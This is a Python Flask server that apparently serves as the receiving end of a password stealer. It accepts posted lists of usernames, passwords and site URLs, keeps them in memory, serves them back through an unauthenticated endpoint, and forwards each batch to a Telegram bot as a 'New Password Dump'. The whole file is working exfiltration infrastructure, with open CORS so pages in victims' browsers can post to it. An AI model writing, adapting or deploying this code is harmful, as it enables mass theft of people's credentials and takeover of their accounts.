import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Get keys from Render Environment Variables
BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID')

# In-memory storage (reset on restart)
STORAGE_DB = []

def send_to_telegram(data):
    if not BOT_TOKEN or not CHAT_ID:
        return False
    
    msg = "<b>🔐 New Password Dump</b>\n"
    msg += f"<i>Time:</i> {data.get('timestamp', 'Unknown')}\n"
    msg += "<hr>"
    
    items = data.get('items', [])
    if not items:
        msg += "<i>No passwords found.</i>"
    else:
        for item in items:
            user = item.get('username', 'N/A')
            pw = item.get('password', 'N/A')
            url = item.get('url', 'No URL')
            
            # Truncate long URLs
            display_url = url[:50] + ("..." if len(url) > 50 else "")
            
            msg += f"• <b>{display_url}</b>\n"
            msg += f"  👤 User: <code>{user}</code>\n"
            msg += f"  🔑 Pass: <code>{pw}</code>\n\n"

    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": msg,
            "parse_mode": "HTML"
        }
        response = requests.post(url, json=payload)
        return response.status_code == 200
    except Exception:
        return False

@app.route('/api/report/add', methods=['POST'])
def add_report():
    try:
        data = request.json
        import datetime
        data['timestamp'] = datetime.datetime.now().isoformat()
        
        STORAGE_DB.append(data)
        
        telegram_success = send_to_telegram(data)
        
        return jsonify({
            "status": "success", 
            "telegram_sent": telegram_success,
            "record_count": len(data.get('items', []))
        }), 200
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/reports', methods=['GET'])
def get_reports():
    return jsonify(STORAGE_DB)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
